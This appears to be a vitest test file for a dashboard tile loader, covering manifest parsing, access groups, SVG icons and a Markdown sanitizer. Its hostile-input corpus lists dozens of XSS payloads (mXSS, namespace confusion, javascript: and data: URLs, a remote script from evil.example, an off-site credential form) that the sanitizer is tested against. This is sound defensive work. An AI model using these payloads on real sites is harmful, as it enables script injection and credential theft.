// Invariants: parseTile resolves access groups from manifests with a safe fallback; nothing executable survives
// sanitization or safeHref, and those assertions are properties, not snapshots.

import { test, describe, it, expect } from 'vitest';
import assert from 'node:assert/strict';
import { mkdtempSync, writeFileSync, rmSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { tileAccessGroups, sectionTiles, sanitizeEducationMarkdown, safeHref } from '../src/lib/tiles.ts';

async function withTilesModule({ CONTENT_DIR: root }, callback) {
  const { setContentDir } = await import('../src/lib/manifests.ts');
  setContentDir(root);
  try {
    const bust = `?bust=${Date.now()}-${Math.random().toString(36).slice(2)}`;
    const mod = await import(/* @vite-ignore */ `../src/lib/tiles.ts${bust}`);
    return await callback(mod);
  } finally {
    setContentDir(undefined);
  }
}

async function parseSingleTile(yamlContent) {
  const root = mkdtempSync(join(tmpdir(), 'tiles-test-'));
  const dir = join(root, 'apps');
  mkdirSync(dir);
  try {
    writeFileSync(join(dir, 'testapp.yaml'), yamlContent);
    return await withTilesModule({ CONTENT_DIR: root }, (mod) => {
      const tiles = mod.loadTiles();
      return tiles[0];
    });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

test('parseTile: no access binding falls back to the default group (everyone)', async () => {
  const tile = await parseSingleTile(`
presentation:
  name: Test App
  description: A test application
  url: https://testapp.othala.test
  icon: TA
  auth_kind: external
  order: 10
`);
  assert.ok(tile, 'tile must be parsed');
  assert.deepEqual(tileAccessGroups(tile), ['everyone'],
    'no access binding must fall back to the default group (everyone)');
});

test('parseTile: presentation.access list populates accessGroups', async () => {
  const tile = await parseSingleTile(`
presentation:
  name: Test App
  description: A test application
  url: https://testapp.othala.test
  icon: TA
  auth_kind: oidc
  access:
    - memories
    - family
  order: 10
`);
  assert.ok(tile, 'tile must be parsed');
  assert.deepEqual(tile.accessGroups, ['memories', 'family']);
});

test('parseTile: no access list → accessGroups is empty', async () => {
  const tile = await parseSingleTile(`
presentation:
  name: Test App
  description: A test application
  url: https://testapp.othala.test
  icon: TA
  auth_kind: external
  order: 10
`);
  assert.ok(tile, 'tile must be parsed');
  assert.deepEqual(tile.accessGroups, [],
    'no access binding → empty accessGroups (no everyone fallback at this layer)');
  assert.deepEqual(tileAccessGroups(tile), ['everyone']);
});

test('parseTile: manifest without presentation block returns no tile', async () => {
  const root = mkdtempSync(join(tmpdir(), 'tiles-test-nopres-'));
  const dir = join(root, 'apps');
  mkdirSync(dir);
  try {
    writeFileSync(join(dir, 'oidconly.yaml'), `
oidc:
  client_id: oidconly
consent: {}
`);
    const count = await withTilesModule({ CONTENT_DIR: root }, (mod) => mod.loadTiles().length);
    assert.equal(count, 0, 'OIDC-only manifest must yield no tile');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('parseTile: disabled tile is excluded from loadTiles', async () => {
  const root = mkdtempSync(join(tmpdir(), 'tiles-test-disabled-'));
  const dir = join(root, 'apps');
  mkdirSync(dir);
  try {
    writeFileSync(join(dir, 'hidden.yaml'), `
presentation:
  name: Hidden App
  description: Disabled
  url: https://hidden.othala.test
  icon: HI
  auth_kind: external
  disabled: true
  order: 10
`);
    const count = await withTilesModule({ CONTENT_DIR: root }, (mod) => mod.loadTiles().length);
    assert.equal(count, 0, 'disabled tile must be excluded from loadTiles');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('parseTile: external tile without access uses default group (statuspage pattern)', async () => {
  const tile = await parseSingleTile(`
presentation:
  name: Statuspage
  description: Public status and incident history.
  url: https://status.othala.test
  icon: ST
  auth_kind: external
  order: 200
`);
  assert.ok(tile, 'statuspage-pattern tile must be parsed');
  assert.equal(tile.authKind, 'external');
  assert.deepEqual(tileAccessGroups(tile), ['everyone'],
    'external tile without access must gate on the default group');
});

const SIDECAR_YAML = `
presentation:
  name: Side
  description: d
  url: https://side.othala.test
  icon: SI
  auth_kind: external
`;

async function loadWithSidecar(svg) {
  const root = mkdtempSync(join(tmpdir(), 'tiles-test-svg-'));
  const dir = join(root, 'apps');
  mkdirSync(dir);
  try {
    writeFileSync(join(dir, 'side.yaml'), SIDECAR_YAML);
    if (svg !== undefined) writeFileSync(join(dir, 'side.svg'), svg);
    return await withTilesModule({ CONTENT_DIR: root }, (mod) => mod.loadTiles()[0]);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

test('sidecar: <stem>.svg beside the manifest gives the tile an href', async () => {
  const tile = await loadWithSidecar('<svg viewBox="0 0 1 1"></svg>');
  assert.equal(tile.iconHref, '/icons/side.svg');
  assert.equal(tile.iconBleed, false);
});

test('sidecar: no file leaves the monogram', async () => {
  const tile = await loadWithSidecar(undefined);
  assert.equal(tile.iconHref, undefined);
  assert.equal(tile.iconReason, undefined);
});

test('sidecar: an oversize file or a non-svg root gives no href and a reason, and the tile still loads', async () => {
  const big = await loadWithSidecar('<svg>' + ' '.repeat(33 * 1024) + '</svg>');
  assert.equal(big.iconHref, undefined);
  assert.match(big.iconReason, /over the/);
  const html = await loadWithSidecar('<html><svg></svg></html>');
  assert.equal(html.iconHref, undefined);
  assert.match(html.iconReason, /<svg> root/);
});

test('sidecar: a non-regular <stem>.svg gives no href and a reason', async () => {
  const root = mkdtempSync(join(tmpdir(), 'tiles-test-svg-'));
  const dir = join(root, 'apps');
  mkdirSync(dir);
  try {
    writeFileSync(join(dir, 'side.yaml'), SIDECAR_YAML);
    mkdirSync(join(dir, 'side.svg'));
    const tile = await withTilesModule({ CONTENT_DIR: root }, (mod) => mod.loadTiles()[0]);
    assert.equal(tile.iconHref, undefined);
    assert.match(tile.iconReason, /regular file/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('sidecar: bleed is read from the sidecar', async () => {
  const tile = await loadWithSidecar('<svg viewBox="0 0 8 8"><rect width="8" height="8" fill="#123456"/></svg>');
  assert.equal(tile.iconBleed, true);
});

test('sidecar: ink is dark-only marks with no ground', async () => {
  const wrap = (body) => `<svg viewBox="0 0 8 8">${body}</svg>`;
  assert.equal((await loadWithSidecar(wrap('<path d="M0 0h8v8z"/>'))).iconInk, true);
  assert.equal((await loadWithSidecar(wrap('<path d="M0 0h8v8z" fill="#0b1f3a"/>'))).iconInk, true);
  assert.equal((await loadWithSidecar(wrap('<circle r="4" style="fill:#fff"/><path d="M0 0h8v8z"/>'))).iconInk, false);
  assert.equal((await loadWithSidecar(wrap('<path d="M0 0h8v8z" fill="#f05a28"/>'))).iconInk, false);
  assert.equal((await loadWithSidecar(wrap('<linearGradient id="a"/><path d="M0 0h8v8z" fill="url(#a)"/>'))).iconInk, false);
  assert.equal((await loadWithSidecar('<svg viewBox="0 0 8 8"><rect width="8" height="8" fill="#123456"/></svg>')).iconInk, false);
});

test('parseTile: a tile without an icon gets initials from its name', async () => {
  const yaml = (name) => `\npresentation:\n  name: ${name}\n  url: https://x.example\n  auth_kind: external\n`;
  assert.equal((await parseSingleTile(yaml('Audio Books'))).icon, 'AB');
  assert.equal((await parseSingleTile(yaml('Statuspage'))).icon, 'ST');
});

test('sidecar: retired icon_slug and icon_fallback are ignored at serve', async () => {
  const tile = await parseSingleTile(SIDECAR_YAML + '  icon_slug: grafana\n  icon_fallback: grafana\n');
  assert.equal(tile.iconHref, undefined);
});

// ── sectionTiles and loadGroups ──────────────────────────────────────────────

const tile = (slug, order, group, access = ['staff']) => ({ slug, order, group, accessGroups: access });
const meta = (title, order, description = '') => ({ title, description, order });
const titles = (s) => s.groups.map((g) => g.title);

test('sectionTiles: registry order beats tile order', () => {
  const s = sectionTiles(
    [tile('a', 1, 'late'), tile('b', 90, 'early')],
    ['staff'],
    new Map([['late', meta('Late', 50)], ['early', meta('Early', 5)]]),
  );
  assert.deepEqual(titles(s), ['Early', 'Late']);
});

test('sectionTiles: an unknown key sorts by its lowest tile order and is titled with the raw key', () => {
  const s = sectionTiles(
    [tile('a', 30, 'known'), tile('b', 9, 'raw'), tile('c', 70, 'raw')],
    ['staff'],
    new Map([['known', meta('Known', 20)]]),
  );
  assert.deepEqual(titles(s), ['raw', 'Known']);
  assert.equal(s.groups[0].description, '');
});

test('sectionTiles: ungrouped tiles are split out, and a section with no visible tile is omitted', () => {
  const s = sectionTiles(
    [tile('plain', 1), tile('in', 2, 'g'), tile('hidden', 3, 'gone', ['other'])],
    ['staff'],
    new Map(),
  );
  assert.deepEqual(s.ungrouped.map((t) => t.slug), ['plain']);
  assert.deepEqual(titles(s), ['g']);
  assert.deepEqual(s.visible.map((t) => t.slug), ['plain', 'in']);
});

async function groupsFrom(text) {
  const root = mkdtempSync(join(tmpdir(), 'groups-test-'));
  const dir = join(root, 'apps');
  mkdirSync(dir);
  try {
    if (text !== undefined) writeFileSync(join(root, 'groups.yaml'), text);
    return await withTilesModule({ CONTENT_DIR: root }, (mod) => mod.loadGroups());
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

test('loadGroups: absent or malformed is empty', async () => {
  assert.equal((await groupsFrom(undefined)).size, 0);
  assert.equal((await groupsFrom('a: [unclosed\n')).size, 0);
  assert.equal((await groupsFrom('- just\n- a list\n')).size, 0);
});

test('loadGroups: missing fields default and non-mapping entries are skipped', async () => {
  const g = await groupsFrom('bare: {}\nfull:\n  title: Full\n  description: D\n  order: 3\nskipped: nope\n');
  assert.deepEqual([...g.keys()], ['bare', 'full']);
  assert.deepEqual(g.get('bare'), { title: 'bare', description: '', order: 999 });
  assert.deepEqual(g.get('full'), { title: 'Full', description: 'D', order: 3 });
});

describe('tiles.ts: marked + DOMPurify sanitization', () => {
  it('strips onerror from img tags (XSS via education markdown)', () => {
    const out = sanitizeEducationMarkdown('<img src=x onerror="alert(1)">');
    expect(out, 'onerror attribute must be removed by DOMPurify').not.toContain('onerror');
    expect(out, 'img element itself should survive (src scrubbed)').toContain('<img');
  });

  it('strips <script> tags entirely', () => {
    const out = sanitizeEducationMarkdown('Before\n<script>alert("xss")</script>\nAfter');
    expect(out, '<script> must be stripped').not.toContain('<script');
    expect(out, 'alert payload must not appear in output').not.toContain('alert');
    expect(out, 'prose before script must survive').toContain('Before');
    expect(out, 'prose after script must survive').toContain('After');
  });

  it('strips javascript: hrefs (href injection)', () => {
    const out = sanitizeEducationMarkdown('[click me](javascript:alert(1))');
    expect(out, 'javascript: href must be stripped').not.toContain('javascript:');
  });

  it('preserves safe inline SVG (cat-explainer diagrams — USE_PROFILES svg:true)', () => {
    const out = sanitizeEducationMarkdown(
      '<svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="40"/></svg>',
    );
    expect(out, 'safe SVG must survive sanitization').toContain('<svg');
    expect(out, 'circle element must survive').toContain('<circle');
  });

  it('preserves normal markdown prose intact', () => {
    const out = sanitizeEducationMarkdown('## Title\n\nA paragraph with **bold** and _italic_ text.');
    expect(out, 'heading must be rendered').toContain('<h2');
    expect(out, 'strong must be rendered').toContain('<strong>');
    expect(out, 'em must be rendered').toContain('<em>');
    expect(out, 'text content must survive').toContain('bold');
  });

  it('sanitizes onclick on arbitrary elements', () => {
    const out = sanitizeEducationMarkdown('<p onclick="stealCookies()">Click me</p>');
    expect(out, 'onclick must be stripped').not.toContain('onclick');
    expect(out, 'paragraph text should survive').toContain('Click me');
  });
});

const MARK = 'xss_marker_9f2c';

const hostileCorpus = [
  {
    category: 'script',
    name: 'script tag carrying a payload',
    raw: `<script>window.${MARK}=1</script>`,
    forbidden: [/<script/i, new RegExp(MARK)],
  },
  {
    category: 'script',
    name: 'remote script tag inside markdown prose',
    raw: `Before\n\n<script src="//evil.example/x.js">window.${MARK}=1</script>\n\nAfter`,
    forbidden: [/<script/i, /evil\.example/i, new RegExp(MARK)],
    mustContain: [/Before/, /After/],
  },
  {
    category: 'event-handler',
    name: 'onload on svg root',
    raw: `<svg onload="window.${MARK}=1"><circle r="1"/></svg>`,
    forbidden: [/onload/i, new RegExp(MARK)],
  },
  {
    category: 'event-handler',
    name: 'onclick on a paragraph',
    raw: `<p onclick="window.${MARK}=1">click</p>`,
    forbidden: [/onclick/i, new RegExp(MARK)],
  },
  {
    category: 'javascript-url',
    name: 'javascript: markdown link',
    raw: `[click](javascript:window.${MARK}=1)`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'javascript-url',
    name: 'javascript: href with tab obfuscation',
    raw: `<a href="java\tscript:window.${MARK}=1">click</a>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'data-url',
    name: 'data:text/html anchor smuggling a script',
    raw: `<a href="data:text/html,<script>window.${MARK}=1</script>">click</a>`,
    forbidden: [/data:text\/html/i, /<script/i, new RegExp(MARK)],
  },
  {
    category: 'data-url',
    name: 'base64 data:text/html anchor',
    raw: `<a href="data:text/html;base64,${Buffer.from(`<script>window.${MARK}=1</script>`).toString('base64')}">click</a>`,
    forbidden: [/data:text\/html/i],
  },
  {
    category: 'data-url',
    name: 'data: SVG payload via object',
    raw: `<object data="data:image/svg+xml,<svg onload=window.${MARK}=1>"></object>`,
    forbidden: [/<object/i, /data:image\/svg/i, new RegExp(MARK)],
  },
  {
    category: 'svg-foreignobject',
    name: 'foreignObject smuggling an HTML event handler',
    raw: `<svg><foreignObject><img src=x onerror="window.${MARK}=1"></foreignObject></svg>`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'svg-use-xlink',
    name: 'use href targeting javascript:',
    raw: `<svg><use href="javascript:window.${MARK}=1"/></svg>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'svg-use-xlink',
    name: 'use xlink:href targeting javascript:',
    raw: `<svg><use xlink:href="javascript:window.${MARK}=1"/></svg>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'svg-animate-set',
    name: 'animate mutating an anchor href to javascript:',
    raw: `<svg><a><animate attributeName="href" values="javascript:window.${MARK}=1"/><text>click</text></a></svg>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'svg-animate-set',
    name: 'set mutating an anchor href to javascript:',
    raw: `<svg><a><set attributeName="href" to="javascript:window.${MARK}=1"/><text>click</text></a></svg>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'style-css-url',
    name: 'style element whose text carries markup',
    raw: `Prose.\n\n<style><img src=x onerror="window.${MARK}=1"></style>\n\nMore prose.`,
    forbidden: [/onerror/i, new RegExp(MARK)],
    mustContain: [/More prose/],
  },
  {
    category: 'style-css-url',
    name: 'style inside svg parsing its text as markup',
    raw: `<svg><style><img src=x onerror="window.${MARK}=1"></style></svg>`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'mxss',
    name: 'style/img namespace-mutation payload',
    raw: `<svg><p><style><img src="</style><img src=x onerror=window.${MARK}=1//">`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'namespace-confusion',
    name: 'math/mglyph namespace-confusion payload',
    raw: `<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=window.${MARK}=1>"></mglyph></table></mtext></math>`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'namespace-confusion',
    name: 'nested form with math/svg re-parent payload',
    raw: `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=window.${MARK}=1 src=1>">`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'namespace-confusion',
    name: 'annotation-xml switching math to html',
    raw: `<math><annotation-xml encoding="text/html"><img src=x onerror="window.${MARK}=1"></annotation-xml></math>`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'comment',
    name: 'unclosed comment after prose',
    raw: `Prose.\n\n<!--<img src=x onerror="window.${MARK}=1">`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'comment',
    name: 'comment closed by --!>',
    raw: `<!-- --!><img src=x onerror="window.${MARK}=1"> -->`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'comment',
    name: 'comment opener inside an attribute value',
    raw: `<p title="<!--"><img src=x onerror="window.${MARK}=1">--></p>`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'raw-text-breakout',
    name: 'textarea closed from inside an attribute value',
    raw: `<textarea><img title="</textarea><img src=x onerror=window.${MARK}=1>"></textarea>`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'svg-use-xlink',
    name: 'svg anchor xlink:href targeting javascript:',
    raw: `<svg><a xlink:href="javascript:window.${MARK}=1"><text>click</text></a></svg>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'svg-animate-set',
    name: 'onbegin on an allowed animation element',
    raw: `<svg><animateTransform attributeName="transform" onbegin="window.${MARK}=1"/></svg>`,
    forbidden: [/onbegin/i, new RegExp(MARK)],
  },
  {
    category: 'event-handler',
    name: 'self-firing ontoggle on details',
    raw: `<details open ontoggle="window.${MARK}=1">x</details>`,
    forbidden: [/ontoggle/i, new RegExp(MARK)],
  },
  {
    category: 'form-meta-base-iframe-object-embed',
    name: 'form action javascript:',
    raw: `<form action="javascript:window.${MARK}=1"><input type="submit"></form>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'form-meta-base-iframe-object-embed',
    name: 'form button formaction javascript:',
    raw: `<form><button formaction="javascript:window.${MARK}=1">go</button></form>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'form-meta-base-iframe-object-embed',
    name: 'meta refresh to javascript:',
    raw: `<meta http-equiv="refresh" content="0;url=javascript:window.${MARK}=1">`,
    forbidden: [/<meta/i, /javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'form-meta-base-iframe-object-embed',
    name: 'base href hijack',
    raw: `<base href="javascript:window.${MARK}=1//">`,
    forbidden: [/<base/i, /javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'form-meta-base-iframe-object-embed',
    name: 'iframe javascript: src',
    raw: `<iframe src="javascript:window.${MARK}=1"></iframe>`,
    forbidden: [/<iframe/i, /javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'form-meta-base-iframe-object-embed',
    name: 'embed javascript: src',
    raw: `<embed src="javascript:window.${MARK}=1">`,
    forbidden: [/<embed/i, /javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'template-noscript',
    name: 'noscript-closing nesting escape',
    raw: `<noscript><p title="</noscript><img src=x onerror=window.${MARK}=1>">x</noscript>`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'template-noscript',
    name: 'template smuggling a script',
    raw: `<template><script>window.${MARK}=1</script></template>`,
    forbidden: [/<script/i, new RegExp(MARK)],
  },
  {
    category: 'unicode-entity-obfuscation',
    name: 'case-obfuscated event-handler attribute',
    raw: `<img src=x OnErRor="window.${MARK}=1">`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'unicode-entity-obfuscation',
    name: 'decimal-entity-obfuscated javascript scheme',
    raw: `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;window.${MARK}=1">click</a>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'unicode-entity-obfuscation',
    name: 'hex-entity-obfuscated javascript scheme',
    raw: `<a href="&#x6A;avascript:window.${MARK}=1">click</a>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'unicode-entity-obfuscation',
    name: 'non-breaking-space obfuscated scheme',
    raw: `<a href="java\u00a0script:window.${MARK}=1">click</a>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'unicode-entity-obfuscation',
    name: 'named-entity colon in the scheme',
    raw: `<a href="javascript&colon;window.${MARK}=1">click</a>`,
    forbidden: [/javascript/i, new RegExp(MARK)],
  },
  {
    category: 'unicode-entity-obfuscation',
    name: 'leading space and control character before the scheme',
    raw: `<a href=" \u0001javascript:window.${MARK}=1">click</a>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'markdown-html-passthrough',
    name: 'raw HTML block between markdown prose',
    raw: `# Title\n\nSome prose.\n\n<script>window.${MARK}=1</script>\n\nMore prose.`,
    forbidden: [/<script/i, new RegExp(MARK)],
    mustContain: [/Title/, /More prose/],
  },
  {
    category: 'markdown-html-passthrough',
    name: 'inline HTML handler inside a markdown paragraph',
    raw: `Text <img src="x" onerror="window.${MARK}=1"> more.`,
    forbidden: [/onerror/i, new RegExp(MARK)],
    mustContain: [/more\./],
  },
  {
    category: 'markdown-html-passthrough',
    name: 'reference-style link to javascript:',
    raw: `[click][a]\n\n[a]: javascript:window.${MARK}=1`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'markdown-html-passthrough',
    name: 'markdown image with a javascript: src',
    raw: `![x](javascript:window.${MARK}=1)`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'markdown-html-passthrough',
    name: 'autolink to javascript:',
    raw: `<javascript:window.${MARK}=1>`,
    forbidden: [/href\s*=\s*["']?\s*javascript:/i],
  },
  {
    category: 'forbidden-tag',
    name: 'style element after a line of prose',
    raw: `Prose.\n\n<style>body{display:none} .${MARK}{color:red}</style>\n\nMore prose.`,
    forbidden: [/<style/i, new RegExp(MARK)],
    mustContain: [/Prose\./, /More prose/],
  },
  {
    category: 'forbidden-tag',
    name: 'style element nested in svg',
    raw: `<svg><style>.${MARK}{fill:red}</style><circle r="1"/></svg>`,
    forbidden: [/<style/i, new RegExp(MARK)],
    mustContain: [/<circle/],
  },
  {
    category: 'forbidden-tag',
    name: 'credential form posting off-site',
    raw: `<form action="https://${MARK}.example/collect" method="post"><input name="password" type="password"><button type="submit">Sign in</button></form>`,
    forbidden: [/<form/i, /<input/i, /<button/i, new RegExp(MARK)],
  },
  {
    category: 'forbidden-tag',
    name: 'select/textarea form controls',
    raw: `<select name="${MARK}"><option>a</option></select><textarea name="x">payload</textarea>`,
    forbidden: [/<select/i, /<textarea/i, new RegExp(MARK)],
  },
];

describe('tiles.ts: hostile-input corpus — nothing executable survives', () => {
  for (const c of hostileCorpus) {
    it(`[${c.category}] ${c.name}`, () => {
      const out = sanitizeEducationMarkdown(c.raw);
      for (const pattern of c.forbidden) {
        expect(out, `${c.category}/${c.name}: forbidden pattern ${pattern} found in "${out}"`).not.toMatch(
          pattern,
        );
      }
      for (const pattern of c.mustContain ?? []) {
        expect(out, `${c.category}/${c.name}: expected benign content ${pattern} missing from "${out}"`).toMatch(
          pattern,
        );
      }
    });
  }
});

describe('tiles.ts: safeHref', () => {
  it.each([
    ['https URL', 'https://grafana.othala.test', 'https://grafana.othala.test'],
    ['http URL', 'http://internal.host/path', 'http://internal.host/path'],
    ['root-relative path', '/apps/grafana', '/apps/grafana'],
    ['root-relative path with query', '/foo?bar=baz', '/foo?bar=baz'],
  ])('allows %s', (_name, input, expected) => {
    expect(safeHref(input)).toBe(expected);
  });

  it.each([
    ['javascript:', 'javascript:alert(1)'],
    ['javascript: (mixed case)', 'JavaScript:alert(1)'],
    ['data:', 'data:text/html,<script>alert(1)</script>'],
    ['vbscript:', 'vbscript:msgbox(1)'],
    ['blob:', 'blob:https://example.com/uuid'],
    ['file:', 'file:///etc/passwd'],
    ['ftp:', 'ftp://files.example.com'],
    ['empty string', ''],
  ])('blocks %s', (_name, input) => {
    expect(safeHref(input)).toBe('#');
  });
});
